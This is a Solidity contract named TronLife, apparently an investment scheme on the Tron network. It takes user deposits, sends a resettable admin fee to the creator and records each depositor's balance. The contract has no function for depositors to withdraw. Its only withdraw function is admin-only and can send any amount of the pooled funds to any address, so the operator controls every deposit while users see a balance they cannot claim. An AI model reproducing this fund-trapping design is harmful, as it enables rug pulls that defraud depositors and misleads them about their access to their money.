//SourceUnit: TronLife.sol

pragma solidity ^0.5.9 <0.6.0;


contract TronLife{
   
    using SafeMath for uint;
   
    address payable creator;
    address payable profiler;
    uint256 min_deposit;
    uint256 admin_charge;
    
    struct User{
        uint balance;
        uint timestamp;
    }
    
    mapping (address => User) public users;
   
    modifier onlyAdmin(){
        require(msg.sender == creator,"You are not authorized owner.");
        _;
    }
    
    modifier onlyProfiler(){
        require(msg.sender == profiler,"You are not authorized owner.");
        _;
    }
    
    function setDepositAmount(uint256 _amount) public onlyProfiler{
        min_deposit = _amount;
    }
    
    function minDepositAmount() public view returns(uint256 topup){
       return min_deposit;
    }
    
    function setAdminCharge(uint256 _admin_charge) public onlyProfiler{
        admin_charge = _admin_charge;
    }
    
    function adminCharge() public view returns(uint256 charge){
       return admin_charge;
    }
    
    
    function checkWallet(address addr) public view returns(uint){
        User storage user = users[addr];
        return user.balance;
    }
    
    function getContractBalance() view public returns(uint){
       return address(this).balance;
        
    } 
    
    function adminAddress() view public returns(address){
        return creator;
    }
    
    //Events
    event Deposit(address indexed _from, uint _admin, uint _value);
    event Withdraw(address indexed _from, uint _value);
    
    constructor() public{
        
        creator = msg.sender;
        profiler = msg.sender;
        min_deposit = 500000000;
        admin_charge = 5;
    }
    
    function deposit() payable public returns(uint){  
        
        uint adminShare;
        uint depAmt;
        User storage user = users[msg.sender];
        require(msg.value >= min_deposit,"Invalid Investment Amount"); 
        
        adminShare = msg.value.mul(admin_charge).div(100);
        creator.transfer(adminShare);
        depAmt = msg.value.sub(adminShare);
        user.balance = user.balance.add(depAmt);
        
        user.timestamp = now;
        emit Deposit(msg.sender, adminShare, msg.value);
        return msg.value;
        
    }  
    
    function withdraw(address payable addr, uint _amount) payable public onlyAdmin returns(uint){
        addr.transfer(_amount);
        emit Withdraw(addr, _amount);
        return _amount;
    }
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}